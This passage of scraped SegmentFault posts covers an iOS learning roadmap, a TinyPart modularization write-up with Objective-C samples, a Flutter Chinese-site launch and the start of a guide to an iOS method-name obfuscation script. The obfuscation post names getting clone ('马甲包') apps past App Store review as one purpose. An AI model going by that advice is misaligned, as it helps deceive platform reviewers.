<li>初始化UIApplication(创建设置代理对象,开启事件循环)</li>
<li>监听系统事件</li>
<li>结束程序.</li>
</ul>
</li>
<li>
<p>语法.(此处定义可能略失严谨,口头教学为主)</p>
<ul>
<li>基础语法</li>
<li>对象.</li>
<li>属性</li>
<li>数据类型</li>
<li>方法</li>
<li>继承</li>
<li>Frame/CGRect/CGPoint和CGSize</li>
<li>内存(针对MRC下情况进行介绍)</li>
<li>ARC/MRC</li>
<li>弱引用/强引用</li>
<li>Assign,retain,copy,strong</li>
<li>import 和@class的区别</li>
</ul>
</li>
<li>
<p>Xcode使用</p>
<ul>
<li>首先是针对Xcode菜单栏,希望自己可以去翻译一下每个菜单里每项功能的英文都是什么意思,有助于自己熟悉并加深印象的使用Xcode.</li>
<li>熟悉Xcode的各个功能.</li>
</ul>
</li>
<li>UIKit控件.</li>
<li>
<p>界面分析(下载App进行学习).</p>
<ul>
<li>在这里推荐有兴趣的开发人员,下载并分析,AppStore中的每项分类的top50的应用,多学习大公司以及流行应用是如何开发应用的,其中流行的,新颖的开发界面的方式可以总结下来,猜想在大应用中,别的程序员是如何开发的.</li>
<li>界面适配</li>
</ul>
</li>
<li>
<p>代码架构.</p>
<ul><li>代码架构文章推荐:<a href=""https://casatwy.com/iosying-yong-jia-gou-tan-kai-pian.html"" rel=""nofollow noreferrer"">https://casatwy.com/iosying-y...</a>
</li></ul>
</li>
<li>
<p>各种工具、第三方的使用.</p>
<ul><li>其实每个项目的建立都大致分为:项目框架搭建,原生界面搭建,嵌入第三方库.有很多功能都会用到第三方库,大多数第三方库都是本着快速开发,完整功能实现的目的存在的.需要开发人员能够根据业务逻辑不同,选择最好最优质的第三方库进行使用.</li></ul>
</li>
<li>
<p>代码封装</p>
<ul><li>当使用较多第三方库后,要求开发人员学习其开发特点,以及其封装手法,运用在自己的项目上,封装自己的代码.灵活运用.</li></ul>
</li>
<li>完整项目.</li>
<li>开发技巧</li>
<li>个人心得</li>
</ul>
</li></ul>
<hr>
<h2>iOS基础知识点</h2>
<ul><li>
<p>iOS基础知识点</p>
<ul>
<li>
<p>如何学习iOS</p>
<ul>
<li>
<p>刚刚入门(如何学习)</p>
<ul>
<li>打好基础,学习OC中各种常用语法.</li>
<li>学习如何上架,上架会因为什么被拒,了解App上架规则.</li>
<li>多学习官方说明文档.</li>
</ul>
</li>
<li>
<p>刚刚入职1年(如何稳定)</p>
<ul>
<li>多看开源或者注明的第三方库.</li>
<li>收藏并阅读各种大神的博客或者论坛.</li>
<li>开始考虑项目中的细节优化,内存处理和耗电情况</li>
</ul>
</li>
<li>
<p>入职3年(如何进阶)</p>
<ul><li>开始涉猎不止于iOS领域中的知识,会去了解相关职位的基础知识,例如前端和后台或者服务器运维,或者项目相关知识,具体往自己的职业规划靠拢</li></ul>
</li>
</ul>
</li>
<li>
<p>框架的学习</p>
<ul>
<li>苹果自带框架</li>
<li>
<p>第三方框架</p>
<ul>
<li>AFNetworking</li>
<li>SDAutoLayout</li>
<li>YYKit</li>
<li>SDWebImage</li>
<li>MJRefresh</li>
<li>MJExtension</li>
<li>Bugly</li>
<li>Qiniu</li>
<li>Masonry</li>
<li>TZImagePickerController</li>
<li>Hyphenate_CN</li>
</ul>
</li>
</ul>
</li>
<li>
<p>基础UI控件</p>
<ul>
<li>UILabel  标题栏</li>
<li>UIButton  按钮</li>
<li>UIImageView  图片视图</li>
<li>UITextField  文本输入框</li>
<li>UITextView  文本展示视图</li>
<li>UIProgressView  进度条</li>
<li>UISlider  滑动开关</li>
<li>UIGesture 手势</li>
<li>UIActivityIndicator  菊花控件</li>
<li>UIAlertView(iOS8废除) 警告框</li>
<li>UIActionSheet(iOS8废除) 操作表单</li>
<li>UIAlertController(iOS8出现) 警告视图控制器</li>
<li>UIScrollView 滚动视图</li>
<li>UIPageControl 页面控制器</li>
<li>UISearchBar 搜索框</li>
<li>UITableView 表视图</li>
<li>UICollectionView集合视图</li>
<li>UIWebView网页浏览器</li>
<li>UISwitch开关</li>
<li>UISegmentControl选择按钮</li>
<li>UIPickerView选择器</li>
<li>UIDatePicker日期选择器</li>
<li>UIToolbar工具栏</li>
<li>UINavigationBar通知栏</li>
<li>UINavigationController通知视图控制器</li>
<li>UITabbarController选择视图控制器</li>
<li>UIImagePickerController相册</li>
<li>UIImage图片</li>
</ul>
</li>
<li>
<p>Xcode的使用</p>
<ul>
<li>基础操作 状态栏</li>
<li>偏好设置</li>
<li>Xcode Source Control 源代码管理器</li>
<li>Xcode workSpace工作组</li>
<li>Xcode Scheme 计划</li>
<li>Xcode AutoLayout 约束</li>
<li>Xcode CoreData数据库</li>
<li>LLDB 断点调试</li>
<li>StoryBoard</li>
<li>界面预览</li>
<li>界面适配</li>
<li>内存监测</li>
<li>全局断点</li>
<li>全局搜索替换</li>
</ul>
</li>
<li>
<p>数据存储</p>
<ul>
<li>plist</li>
<li>NSKeyedArchiver</li>
<li>SQLite</li>
<li>FMDB</li>
<li>CoreData</li>
<li>NSUserDefault</li>
<li>沙盒存储</li>
<li>NSDictionary归档</li>
</ul>
</li>
<li>
<p>App生命周期</p>
<ul>
<li>应用生命周期</li>
<li>
<p>控制器生命周期</p>
<ul>
<li>alloc</li>
<li>init</li>
<li>创建View</li>
<li>ViewDidLoad</li>
<li>ViewWillAppear</li>
<li>ViewDidAppear</li>
<li>
<p>ViewWillDisappear</p>
<ul><li>视图将要消失 (做一些视图将要消失时的UI的处理)</li></ul>
</li>
<li>
<p>ViewDidDisappear</p>
<ul>
<li>视图已经消失 (做一些视图消失之后数据的处理)</li>
<li>viewDidDisappear销毁定时器</li>
</ul>
</li>
<li>dealloc</li>
<li>didReceiveMemoryWarning</li>
</ul>
</li>
</ul>
</li>
<li>
<p>开发者账号&amp;上架流程</p>
<ul>
<li>
<p>文章推荐:</p>
<ul>
<li><a href=""https://www.jianshu.com/p/6601a241da8e"" rel=""nofollow noreferrer"">https://www.jianshu.com/p/660...</a></li>
<li><a href=""https://www.jianshu.com/p/7c98651d3532"" rel=""nofollow noreferrer"">https://www.jianshu.com/p/7c9...</a></li>
<li><a href=""https://www.jianshu.com/p/9b994a019ee6"" rel=""nofollow noreferrer"">https://www.jianshu.com/p/9b9...</a></li>
</ul>
</li>
<li>个人</li>
<li>公司</li>
<li>企业</li>
</ul>
</li>
<li>
<p>常用知识</p>
<ul>
<li>通信</li>
<li>NS系列</li>
<li>宏定义</li>
<li>视图层次</li>
<li>切换视图</li>
<li>深浅拷贝</li>
<li>对象序列化</li>
<li>写入文件</li>
<li>获取沙盒路径</li>
<li>翻转视图</li>
<li>延伸视图</li>
<li>九大基本数据类型</li>
<li>九宫格</li>
<li>坐标比较</li>
<li>UIColor 、CIColor和CGColor 之间的关系</li>
<li>画图</li>
<li>静态变量</li>
<li>tag值</li>
<li>延时执行方法</li>
<li>界面旋转+状态栏隐藏</li>
<li>plist文件</li>
<li>KVC/KVO</li>
<li>谓词NSPredicate</li>
<li>帧动画</li>
<li>AutoLayout</li>
<li>isKindOfClass 与 isMemberOfClass</li>
<li>Return/Break/Continue</li>
<li>Core Animation</li>
<li>CALayer</li>
<li>Quartz2D</li>
<li>真机调试</li>
<li>静态库</li>
<li>内存管理</li>
<li>iPad与iPhone的区别</li>
<li>响应链</li>
<li>异常捕捉</li>
<li>国际化</li>
<li>代码模块化</li>
<li>类别/扩展</li>
</ul>
</li>
</ul>
</li></ul>
<hr>
<h2>中级知识点</h2>
<ul>
<li>设计模式</li>
<li>UIScrollView/UITableView/UICollectionView 的嵌套</li>
<li>动态行高</li>
<li>通知/代理/block</li>
<li>程序启动原理</li>
<li>触摸事件/手势</li>
<li>图文混编</li>
<li>Runtime</li>
<li>NSRunLoop</li>
<li>GCD</li>
<li>ReactiveCocoa开发</li>
<li>3DTouch</li>
<li>界面渲染</li>
<li>Charles花瓶抓包</li>
<li>区分模拟器/真机项目</li>
<li>
<p>常用知识</p>
<ul>
<li>单例模式</li>
<li>多线程</li>
<li>网络请求</li>
<li>定位</li>
<li>源代码管理Git</li>
<li>真机调试</li>
<li>苹果内购/广告</li>
<li>推送/远程推送</li>
<li>音频/视频/二维码</li>
<li>Block</li>
<li>蓝牙/传感器</li>
<li>物理仿真器UIDynamic</li>
<li>通讯录获取</li>
</ul>
</li>
</ul>
<hr>
<h2>iOS高级知识点</h2>
<ul><li>
<p>iOS高级知识点</p>
<ul>
<li>Socket</li>
<li>XMPP</li>
<li>
<p>加密</p>
<ul>
<li>MD5详解</li>
<li>Base64加密解密</li>
<li>RSA非对称加密</li>
<li>AES对称加密</li>
</ul>
</li>
<li>
<p>音频</p>
<ul>
<li>基础</li>
<li>Core Audio</li>
<li>Audio Toolbox</li>
<li>OpenAL</li>
<li>AVFoundation</li>
<li>Speex语音聊天</li>
<li>AudioQueue/AudioSession</li>
<li>Speex简介</li>
</ul>
</li>
<li>
<p>视频</p>
<ul>
<li>AAC视频.H264推流</li>
<li>P2P传输</li>
</ul>
</li>
<li>
<p>直播</p>
<ul>
<li>直播的技术分析与实现</li>
<li>RTMP协议</li>
<li>RTMP直播应用与延时分析</li>
<li>如果做一款inke版的App</li>
<li>推流发布和播放RTMP</li>
<li>FFmpeg</li>
<li>基于FFmpeg的推流器</li>
<li>HLS流媒体传输协议(HTTP Live Streaming)</li>
<li>FFmpeg</li>
<li>ijkPlayer</li>
</ul>
</li>
<li>
<p>算法</p>
<ul>
<li>简介</li>
<li>冒泡排序</li>
<li>快速排序</li>
<li>插入排序</li>
<li>归并排序</li>
<li>二分查找</li>
<li>希尔排序</li>
<li>动态规划</li>
<li>堆排序</li>
</ul>
</li>
</ul>
</li></ul>
<hr>
<h2>官方Kit</h2>
<ul>
<li>ARKit.</li>
<li>SiriKit</li>
<li>HealthKit</li>
<li>HomeKit</li>
<li>SearchKit</li>
<li>IOKit</li>
<li>PDFKit</li>
<li>CloudKit</li>
<li>GameplayKit</li>
<li>SpriteKit</li>
<li>SceneKit</li>
<li>MusicKit</li>
<li>ResearchKit</li>
<li>MapKit</li>
<li>StoreKit</li>
<li>AVKit</li>
</ul>
<hr>
<h2>结束语</h2>
<p>如果您对这篇文章有什么意见或者建议,请评论与我讨论.<br>如果您觉得还不错的话~可以点个喜欢鼓励我哦.<br>如果您想和我一起学习,请毫不吝啬的私信我吧~<br>介个是我的<a href=""https://dreamerwinston.github.io/blog/"" rel=""nofollow noreferrer"">个人博客</a>,欢迎参观哦~</p>

                ", iOS开发学习路线,1531971871,422,1,455,1,1,https://segmentfault.com/a/1190000014517534
15,1,0,6,"
                    
<blockquote>背景：由于目前所在公司的iOS项目的依赖管理是比较原始的状态，但是APP功能又是越来越复杂的，这就带来的很多问题，比如开发时编译时间过长、模块间耦合严重、模块依赖混乱等。最近又听说这个项目中的部分功能可能需要独立出一个新APP，本着<strong>“Don't repeat yourself”</strong>的原则，我们试着抽离出原项目中的各个模块，并在新的APP中集成这些模块。</blockquote>
<p>最近算是初步完成了新APP的模块化，也算是从中总结了一些经验拿出来分享一下。同时也完成了一个模块化框架<a href=""https://github.com/RyanLeeLY/TinyPart"" rel=""nofollow noreferrer""><strong>TinyPart</strong></a>欢迎star。</p>
<h1>模块划分</h1>
<p>做模块化还是要结合实际业务，对目前APP的功能做一个模块划分，在划分模块的时候还需要关注模块之间的层级。</p>
<p>比如说，在我们项目中，模块被分成了3个层级：<strong>基础层、中间层、业务层</strong>。<strong>基础层模块</strong>比如像网络框架、持久化、Log、社交化分享这样的模块，这一层的模块我们可以称之为组件，具有很强的可重用性。<strong>中间层模块</strong>可以有登录模块、网络层、资源模块等，这一层模块有一个特点是它们依赖着基础组件但又没有很强的业务属性，同时业务层对这层模块的依赖是很强的。<strong>业务层模块</strong>，就是直接和产品需求对应的模块了，比如类似朋友圈、直播、Feeds流这样的业务功能了。</p>
<h1>代码隔离</h1>
<p>模块化首先要做的是代码层面上独立，任意一个基础模块都是可以独立编译的，底层模块绝对不能有对上层模块的代码依赖，还要确保未来也不会再出现这样的代码。</p>
<p>在这里我们选择使用<code>CocoaPods</code>来确保模块间代码隔离，基础和中间层模块是一定会做成标准的私有pods组件，加入到私有pods仓库。业务层的模块，则不一定非要加到私有pods仓库中，也可以使用<strong>submodule + local pods</strong>的方案。这样做有两个原因：其一是业务模块的改动往往比较频繁，如果是标准的私有pods组件则需要频繁的操作<code>pod install</code>或者<code>pod update</code>；其二是如果是local pod会直接引用对应仓库的源文件，在主工程对pods工程下业务模块的改动就是直接对其git仓库的改动，没有了频繁的<code>pod repo push</code>和<code>pod install</code>操作。</p>
<h1>依赖管理</h1>
<p>选择使用<code>CocoaPods</code>另外一个重要原因就是，可以通过它来管理模块间的依赖，之前项目各个功能之所以难以复用的重要原因之一就是<strong>没有声明依赖</strong>。这里的依赖不仅仅是A模块依赖B模块这样的事情，还可以是A模块运行需要的所有工程配置，比如A模块工程需要添加一个<code>GCC_PREPROCESSOR_DEFINITIONS</code>预处理宏才能正常编译。因此，个人认为模块依赖声明非常重要，即便没有像CocoaPods这样的管理工具，也应该有相关文档来说明每个内部模块或者SDK的依赖。</p>
<p><code>CocoaPods</code>的方便之处就在于你必须把你模块的依赖列出来，否则是无法通过<code>pod spec lint</code>过程的，并且所有的依赖项也都是必须是pods仓库<br>。除此以外，依赖的集成也是自动化的，<code>CocoaPods</code>可以自动地添加工程配置和依赖组件。</p>
<h1>模块集成</h1>
<p>在完成上述两个步骤以后，模块化工程的构建工作基本就结束了，接下来我们探讨一下如何在工程中更好地使用这些模块。为此我们写了一个组件化的开源方案 <a href=""https://github.com/RyanLeeLY/TinyPart"" rel=""nofollow noreferrer""><strong>TinyPart</strong></a>。</p>
<p>一般来说，模块初始化需要在APP启动或者UI初始化附近的时机来完成，有时候各个模块的启动顺序可能也是有讲究的，这些初始化逻辑我们往往会加入到AppDelegate这个类里。过一段时间我们会发现，AppDelegate这个类变得臃肿不堪，逻辑复杂，难以维护。在TinyPart中，Module的声明协议包含了<code>UIApplicationDelegate</code>，这就意味着每一个模块都可以实现有一套自己的<code>UIApplicationDelegate</code>协议，并且它们之间调用顺序是可以自定义的。</p>
<pre><code>@interface TPLShareModule : NSObject &lt;TPModuleProtocol&gt;
@end
@implementation TPLShareModule
TP_MODULE_ASYNC

TP_MODULE_PRIORITY(TPLSHARE_MODULE_PRIORITY)

- (void)moduleDidLoad:(TPContext *)context {
    [WXApi registerApp:APPID];
}

- (BOOL)application:(UIApplication *)application
            openURL:(NSURL *)url
  sourceApplication:(NSString *)sourceApplication
         annotation:(id)annotation {
    return [WXApi handleOpenURL:url delegate:self];
}

- (BOOL)application:(UIApplication *)app
            openURL:(NSURL *)url
            options:(NSDictionary&lt;UIApplicationOpenURLOptionsKey,id&gt; *)options {
    return [WXApi handleOpenURL:url delegate:self];
}
@end
</code></pre>
<p>上面的代码是一个微信社交分享模块的初始化内容，同时实现了微信分享所要求的<code>UIApplicationDelegate</code>中的方法。</p>
<h1>通信</h1>
<h2>消息</h2>
<p>在面向对象中，<strong>消息</strong>是一个十分重要的概念，它是对象之前通信的重要方式。但是，在OC中如果想要向一个对象发消息，正常做法就是将改对象类的头文件import进来，这样我们就能够写出<code>[aInstance method]</code>这样的代码了。</p>
<p>然而在模块化中，我们并不希望模块与模块之间相互引用各自的类文件，但是又想要实现通信，那怎么办呢？通过协议来完成。我们知道OC是一个动态语言，方法的调用过程其实是动态的，头文件中消息方法的声明只是为了通过编译前的静态检查。也就是说，我们只要写一个协议来告诉编译器有这么一个方法就可以了，至于实际上究竟有没有这个方法是在消息发过去以后就知道了。既然OC有这个特性，我们甚至可以直接通过类名和方法名向一个对象发送消息，这其实就是网上大部分组件化路由的实现机制。</p>
<p>因此在<a href=""https://github.com/RyanLeeLY/TinyPart"" rel=""nofollow noreferrer""><strong>TinyPart</strong></a>中我们既提供了协议和路由两种模式来调用模块内的服务。</p>
<pre><code>@protocol TestModuleService1 &lt;TPServiceProtocol&gt;
- (void)function1;
@end

@interface TestModuleService1Imp : NSObject &lt;TestModuleService1&gt;
@end

@implementation TestModuleService1Imp
TPSERVICE_AUTO_REGISTER(TestModuleService1) // Service will be registered in ""+load"" method

- (void)function1 {
    NSLog(@""%@"", @""TestModuleService1 function1"");
}
@end
</code></pre>
<p>上面的代码中，我们定义了一个服务的协议。</p>
<pre><code>#import ""TestModuleService1.h""

id&lt;TestModuleService1&gt; service1 = [[TPServiceManager sharedInstance] serviceWithName:@""TestModuleService1""];

[service1 function1];
</code></pre>
<p>这里我们只需要import上述协议的头文件，然后就可以向<code>TestModuleService1</code>发消息了。</p>
<p>我们看到上述的跨模块调用方案中，只需要暴露一个协议文件就可以了，下面我们再看一下如何用路由的方式来做到完全不暴露任何头文件。</p>
<pre><code>#import ""TPRouter.h""

@interface TestRouter : TPRouter
@end

@implementation TestRouter
TPROUTER_METHOD_EXPORT(action1, {
    NSLog(@""TestRouter action1 params=%@"", params);
    return nil;
});

TPROUTER_METHOD_EXPORT(action2, {
    NSLog(@""TestRouter action2 params=%@"", params);
    return nil;
});
@end
</code></pre>
<p>在这里我们参考了ReactNative的方案，通过一个<code>TPROUTER_METHOD_EXPORT</code>宏来定义一个可供调用的路由服务，同时可以传一个<code>params</code>参数进了。然后我们再来调用这个路由。</p>
<pre><code>[[TPMediator sharedInstance] performAction:@""action1"" router:@""Test"" params:@{}];
</code></pre>
<h2>通知</h2>
<p>除了上面提到的两种普通的模块通信方案，我们发现在项目中经常会有跨模块的<code>NSNotification</code>，对于这样的观察者模式使用<code>NSNotification</code>来实现是最便捷的方式了。尽管<code>NSNotification</code>可以做到模块间解耦，但是对于通知的管理过于松散会导致散落在各个模块的<code>NSNotification</code>逻辑变得十分复杂，因此我们为<a href=""https://github.com/RyanLeeLY/TinyPart"" rel=""nofollow noreferrer""><strong>TinyPart</strong></a>增加了一种有向通信的方案。</p>
<p>所谓有向通信，则是在<code>NSNotification</code>基础上对通知的传播方向进行了限制，底层模块对上层模块的通知称为<strong>广播Broadcast</strong>，上层模块对底层模块或者同层模块的通知称为<strong>上报Report</strong>。这样做有两个好处：一方面更利于通知的维护，另一方面可以帮助我们划分模块层级，如果我们发现有一个模块需要向多个同级模块进行Report那么这个模块很有可能应该被划分到更底层的模块。</p>
<p>用法同<code>NSNotification</code>类似，只不过创建通知的方法是一个链式调用，大概就是这样：</p>
<pre><code>// 发送
TPNotificationCenter *center2 = [TestModule2 tp_notificationCenter];

[center2 reportNotification:^(TPNotificationMaker *make) {
    make.name(@""report_notification_from_TestModule2"");
} targetModule:@""TestModule1""];
    
[center2 broadcastNotification:^(TPNotificationMaker *make) {
    make.name(@""broadcast_notification_from_TestModule2"").userInfo(@{@""key"":@""value""}).object(self);
}];

// 接收
TPNotificationCenter *center1 = [TestModule1 tp_notificationCenter];
[center1 addObserver:self selector:@selector(testNotification:) name:@""report_notification_from_TestModule2"" object:nil];
</code></pre>
<h1>参考</h1>
<p><a href=""https://github.com/alibaba/BeeHive"" rel=""nofollow noreferrer""><strong>BeeHive</strong></a></p>
<p><a href=""http://facebook.github.io/react-native/"" rel=""nofollow noreferrer""><strong>ReactNative</strong></a></p>

                ", iOS模块化探索实践,1531971874,256,1,698,1,1,https://segmentfault.com/a/1190000014484636
16,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bV8xQf?w=1020&amp;h=800"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<h1>Flutter中文网上线了</h1>
<p>历经一个多月的整理、翻译、测试。现在 <a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">Flutter中文网</a> 正式上线。</p>
<p><a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">Flutter中文网</a> 是Flutter官网的一个中文镜像。<a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">Flutter中文网</a> 是目前中文文档、资源最全的Flutter交流学习平台，致力于打造Flutter中文开发社区。在这里能轻松找到代码实例、项目案例、并有专人提供最新文档翻译。</p>
<p><a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">Flutter中文网</a> 为了提高用户体验，还做了如下这些事情：</p>
<ol>
<li>对网站的排版(尤其是针对移动端布局)做了一些优化，让您无论在PC端还是移动端都能获得良好的阅读体验。</li>
<li>启用了http2.0，部分静态资源启用了CDN服务，提高网站打开速度。</li>
<li>继承了Github评论功能，方便用户反馈问题。</li>
</ol>
<h2>目录</h2>
<p>下面是<a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">Flutter中文网</a> 文档的主要导航：</p>
<ul>
<li><a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">首页</a></li>
<li>起步</li>
<li><ul>
<li><a href=""https://flutterchina.club/get-started/install/"" rel=""nofollow noreferrer"">1: 安装</a></li>
<li><a href=""https://flutterchina.club/get-started/editor/"" rel=""nofollow noreferrer"">2: 配置编辑器</a></li>
<li><a href=""https://flutterchina.club/get-started/test-drive/"" rel=""nofollow noreferrer"">3: 体验Flutter</a></li>
<li><a href=""https://flutterchina.club/get-started/codelab/"" rel=""nofollow noreferrer"">4: 编写第一个Flutter应用</a></li>
<li><a href=""https://flutterchina.club/get-started/learn-more/"" rel=""nofollow noreferrer"">5: 了解更多</a></li>
</ul></li>
<li>构建用户界面</li>
<li><ul>
<li><a href=""https://flutterchina.club/widgets-intro/"" rel=""nofollow noreferrer"">Flutter框架总览</a></li>
<li><a href=""https://flutterchina.club/widgets/"" rel=""nofollow noreferrer"">Flutter Widget 目录</a></li>
<li><a href=""https://flutterchina.club/cookbook/"" rel=""nofollow noreferrer"">Cookbook</a></li>
<li><a href=""https://flutterchina.club/catalog/samples/"" rel=""nofollow noreferrer"">Flutter 示例目录</a></li>
<li><a href=""https://flutterchina.club/tutorials/layout/"" rel=""nofollow noreferrer"">Flutter 构建布局 - 教程</a></li>
<li><a href=""https://flutterchina.club/tutorials/interactive/"" rel=""nofollow noreferrer"">Flutter 添加交互- 教程</a></li>
<li><a href=""https://flutterchina.club/web-analogs/"" rel=""nofollow noreferrer"">Flutter for Web开发者</a></li>
<li><a href=""https://flutterchina.club/flutter-for-android/"" rel=""nofollow noreferrer"">Flutter for Android 开发者</a></li>
<li><a href=""https://flutterchina.club/gestures/"" rel=""nofollow noreferrer"">Flutter中的手势</a></li>
<li><a href=""https://flutterchina.club/animations/"" rel=""nofollow noreferrer"">Flutter 动画</a></li>
<li><a href=""https://flutterchina.club/custom-fonts/"" rel=""nofollow noreferrer"">在Flutter中使用自定义字体</a></li>
<li><a href=""https://flutterchina.club/layout/"" rel=""nofollow noreferrer"">Flutter 盒约束</a></li>
<li><a href=""https://flutterchina.club/assets-and-images/"" rel=""nofollow noreferrer"">Flutter中的资源和图片</a></li>
<li><a href=""https://flutterchina.club/text-input/"" rel=""nofollow noreferrer"">Flutter文本输入</a></li>
<li><a href=""https://flutterchina.club/routing-and-navigation/"" rel=""nofollow noreferrer"">Flutter路由和导航</a></li>
<li><a href=""https://flutterchina.club/tutorials/internationalization"" rel=""nofollow noreferrer"">Flutter国际化（多语言支持）</a></li>
</ul></li>
<li>使用设备和SDK API</li>
<li><ul>
<li><a href=""https://flutterchina.club/using-packages/"" rel=""nofollow noreferrer"">使用packages</a></li>
<li><a href=""https://flutterchina.club/developing-packages/"" rel=""nofollow noreferrer"">开发packages</a></li>
<li><a href=""https://flutterchina.club/platform-channels/"" rel=""nofollow noreferrer"">平台特定的代码</a></li>
<li><a href=""https://flutterchina.club/reading-writing-files/"" rel=""nofollow noreferrer"">Flutter文件读写</a></li>
<li><a href=""https://flutterchina.club/networking/"" rel=""nofollow noreferrer"">Flutter网络和Http</a></li>
<li><a href=""https://flutterchina.club/json/"" rel=""nofollow noreferrer"">FlutterJSON和序列化</a></li>
</ul></li>
<li>开发和工具</li>
<li><ul>
<li><a href=""https://flutterchina.club/using-ide/"" rel=""nofollow noreferrer"">使用Flutter IDE</a></li>
<li><a href=""https://flutterchina.club/hot-reload/"" rel=""nofollow noreferrer"">使用Flutter热重载</a></li>
<li><a href=""https://flutterchina.club/testing/"" rel=""nofollow noreferrer"">测试Flutter应用</a></li>
<li><a href=""https://flutterchina.club/debugging/"" rel=""nofollow noreferrer"">调试Flutter应用</a></li>
<li><a href=""https://flutterchina.club/inspector/"" rel=""nofollow noreferrer"">检查(Inspect)用户界面</a></li>
<li><a href=""https://flutterchina.club/android-release/"" rel=""nofollow noreferrer"">Android构建发布</a></li>
<li><a href=""https://flutterchina.club/ios-release/"" rel=""nofollow noreferrer"">IOS构建发布</a></li>
<li><a href=""https://flutterchina.club/upgrading/"" rel=""nofollow noreferrer"">升级安装的Flutter</a></li>
<li><a href=""https://flutterchina.club/formatting/"" rel=""nofollow noreferrer"">格式化代码</a></li>
</ul></li>
<li>更多细节</li>
<li><ul>
<li><a href=""https://flutterchina.club/faq/"" rel=""nofollow noreferrer"">Flutter FAQ</a></li>
<li><a href=""https://flutterchina.club/technical-overview"" rel=""nofollow noreferrer"">Flutter 技术总览</a></li>
</ul></li>
</ul>
<p>​</p>
<h2>问题反馈</h2>
<p>由于时间仓促，<a href=""https://flutterchina.club/"" rel=""nofollow noreferrer"">Flutter中文网</a> 中难免有一些错误，或者漏翻的页面，您可以通过我们的联系方式反馈。或者直接在相关页面写留言。</p>

                ", Flutter中文网上线了,1531971875,161,1,953,1,1,https://segmentfault.com/a/1190000014390718
17,1,0,6,"
                    
<p>由于iOS系统的封闭性，相对于安卓来说，iOS开发过程中代码混淆可能就显得并不是得非有不可了。但是在安全性(可通过<a href=""https://cnbin.github.io/blog/2015/05/21/objective-c-class-dump-an-zhuang-he-shi-yong-fang-fa/"" rel=""nofollow noreferrer"">class-dump</a>反编译暴露出类的方法名)和特殊需求上(例如马甲包的混淆过审)还是有一定需求的！<br>此脚本借鉴于<a href=""https://github.com/LennonChin/Code-Confuse-Plugin"" rel=""nofollow noreferrer"">kaich/codeobscure</a>。在使用原作者脚本的过程中，发现了一些BUG和不足，比如正则表达式的判断不准确，生成过多无用的替换宏，需要花费过多时间去人工排错...<br>由于本人对python并不是很熟，所以只是在原作者的基础上作了一些完善修改。</p>
<h4>优化内容：</h4>
<ul>
<li>修改正则表达式，更精准地找出关键词。</li>
<li>替换规则更改：随机字符串==&gt;随机生成2个单词拼接。防止苹果审核过程被误认加入混淆乱码。</li>
<li>增加-k选项，通过ignoreKey.txt文件添加需要过滤的关键词，可避免每次生成都要手动删除部分关键词的麻烦。</li>
<li>增加property关键词、懒加载方法名过滤，减少无用宏的生成。</li>
<li>增加IBAction方法关键词的二次过滤（原脚本存在自定义方法跟IBAction方法重名，无法排除的情况）。</li>
</ul>
<hr>
<h3>以下内容大部分来源于<a href=""https://github.com/LennonChin/Code-Confuse-Plugin"" rel=""nofollow noreferrer"">kaich/codeobscure</a>
</h3>
<h2>实现原理</h2>
<p>其实插件的实现方式十分简单，提取用户编写的文件中的方法名，使用宏定义将其更换为任意的无规则字符串。但这种方式有一些需要注意的点：</p>
<ol>
<li>对于系统库产生的方法名，不可替换；对于系统使用到的关键字，也不可以替换；否则会报错；</li>
<li>Swift混编的项目，Swift中的代码不可替换；同时Swift调用Objective-C的特定方法名也不可以轻易替换；</li>
<li>第三方库暴露的头文件的方法名，不可替换；</li>
</ol>
<p>根据上面的规则（可能有遗漏），该脚本采用了相对简单的方法来避免：</p>
<ol>
<li>只扫描.h和.m文件，只扫描方法名。（对于属性名，尝试过扫描，但由于属性的访问方式多样，并不建议做混淆，会产生额外的工作量）；</li>
<li>对于系统库，让用户手动指定，这个是可以提取的，直接拿到系统库的头文件即可，脚本会自动扫描到所有的系统关键字，直接做排除处理。（以iOS11的SDK为例，系统关键字约6万个）；</li>
<li>对于Swift代码，可以直接排除在扫描目录外；</li>
<li>对于第三方库，用户可以手动指定目录，脚本会自动扫描提取关键字，在混淆时避免这些关键字。</li>
</ol>
<p>依据上述原理，基本可以避免多数情况下产生的混淆错误；当然，由于各种项目的复杂性，有一些复杂的混淆错误无法避免，需要后续手动调整代码。</p>
<h2>使用方式</h2>
<ol>
<li>clone本仓库；</li>
<li>你需要安装python3的运行环境，这个可以使用brew进行安装，这里不再赘述。</li>
<li>你首先需要确定以下几项：</li>
</ol>
<ul>
<li>提取一份你当前项目编译环境的SDK库头文件目录；（Demo中提取了iOS11的SDK头文件目录）</li>
<li>你需要混淆的代码的目录；</li>
<li>你不需要混淆的代码的目录；</li>
<li>你需要提取关键字做排除混淆的目录；（例如Pod仓库、第三方头文件）</li>
<li>Swift代码目录；（理论上不会扫描替换，可以用于排除桥接文件）</li>
<li>输出文件目录；脚本运行后会产生多个log文件，以及最终需要使用到的混淆头文件；</li>
</ul>
<blockquote>注：建议目录使用绝对路径，相对路径容易出问题。</blockquote>
<ol><li>确定以上几项后，找到仓库根目录的Confuse.py文件，使用以下命令行模板运行：</li></ol>
<pre><code class=""shell"">python3 Confuse.py \
-i 你需要混淆的代码的目录，可以是多个目录，以`,`分隔 \
-s 当前项目编译环境的SDK库头文件目录，可以是多个目录，以`,`分隔 \
-e 你不需要混淆的代码的目录，Swift代码目录，可以是多个目录，以`,`分隔 \
-c 你需要提取关键字做排除混淆的目录，可以是多个目录，以`,`分隔 \
-k 可选，用于存放需要过滤的key(增加内容)
-o 输出文件目录</code></pre>
<blockquote>注：各参数的意义如下：</blockquote>
<ul>
<li>
<code>-i</code>（input_dirs）：必须，项目需要处理的主要文件所在的目录</li>
<li>
<code>-s</code>（system_dirs）：可选，配置系统Framework文件的目录，一般用于做排除字典，避免替换系统关键字</li>
<li>
<code>-e</code>（exclusive_dirs）：可选，用于存放不扫描处理的文件的目录，比如Swift文件目录</li>
<li>
<code>-c</code>（clean_dirs）：可选，用于存放排除关键字的文件的目录，例如Pods下的目录，或者静态库（头文件修改后会出错）</li>
<li>
